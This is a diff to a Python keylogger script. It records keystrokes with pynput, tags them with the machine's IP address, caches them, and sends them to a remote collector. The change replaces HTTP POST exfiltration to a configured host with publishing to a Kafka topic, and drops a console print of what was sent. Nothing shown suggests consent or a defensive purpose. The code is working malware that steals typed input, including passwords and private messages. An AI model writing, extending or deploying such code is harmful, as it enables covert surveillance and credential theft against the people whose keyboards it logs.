@@ -1,10 +1,12 @@
 from pynput.keyboard import Key, Listener
 import socket
-from requests import post
 from user_details import UserDetails
+from kafka_producer import KeyboardInputProducer
 from configparser import SafeConfigParser
 
 currentString = ''
+
+producer = None
 
 cache = []
 cache_size = 20
@@ -42,46 +44,27 @@ def get_config_parser():
     return parser
 
 
-def get_destination_url():
+def get_topic():
     parser = get_config_parser()
-    host = parser.get('destination', 'host')
-    port = parser.get('destination', 'port')
-    return host, port
+    return parser.get('destination', 'topic')
 
 
-def post_message(message: UserDetails):
-    host, port = get_destination_url()
-    endpoint = 'user-details'
-    post(url="http://{}:{}/{}".format(host, port, endpoint), json=message.to_json())
+def get_bootstrap_server():
+    parser = get_config_parser()
+    return parser.get('destination', 'bootstrap_server')
 
 
-def post_details_list(details_list: list):
-    host, port = get_destination_url()
-    endpoint = 'user-details'
-    post(url="http://{}:{}/{}/list".format(host, port, endpoint), json=get_details_as_dict_list(details_list))
-
-
-def get_details_as_dict_list(details_list: list):
-    result = []
-    for details in details_list:
-        result.append(details.__dict__)
-    return result
-
-
-def get_details_as_json(details_list: list):
-    json = '['
-
-    for details in details_list:
-        json += details.to_json()
-        json += ', '
-    return json[0:len(json) - 2] + ']'
+def publish_on_topic(user_details: UserDetails):
+    global producer
+    if producer is None:
+        producer = KeyboardInputProducer(bootstrap_server=get_bootstrap_server(), topic=get_topic())
+    producer.publish_message(user_details)
 
 
 def send_message(message):
     if message == '' or message is None: return
     ip = get_ip_address()
     user_details = UserDetails(ip, message)
-    print('Sent {}'.format(user_details.to_json()))
     add_to_cache(user_details)
 
 
@@ -95,8 +78,13 @@ def add_to_cache(details: UserDetails):
     global cache_size
     cache.append(details)
     if len(cache) > cache_size:
-        post_details_list(cache)
+        send_cache(cache)
         clear_cache()
+
+
+def send_cache(cache: list):
+    for details in cache:
+        publish_on_topic(details)
 
 
 def on_press(key):
